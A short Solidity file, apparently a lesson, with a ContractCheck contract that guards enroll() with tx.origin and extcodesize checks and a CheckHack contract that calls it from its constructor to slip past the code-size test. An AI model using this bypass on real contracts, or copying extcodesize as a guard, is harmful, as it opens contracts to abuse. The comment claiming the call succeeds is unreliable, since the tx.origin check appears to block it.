// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

contract ContractCheck {
    mapping (address => bool) public entrants;

    function isContract(address account) public view returns (bool){
        uint256 size;

        assembly {
            size := extcodesize(account)  // 判断是否是合约地址？
        }
        return size > 0; 
    }

    function enroll() external {
        require(tx.origin == msg.sender,"not allowed");
        require(!isContract(msg.sender), "no contract allowed");
        entrants[msg.sender] = true;
    }
}

contract CheckHack {
    bool public isContract;
    address public addr;

    constructor(address _target){
        isContract = ContractCheck(_target).isContract(address(this));
        addr = address(this);
        // 执行成功
        ContractCheck(_target).enroll();
    }
}

// 0x86BA8f41279c2B029EE140698D09c0766A71419f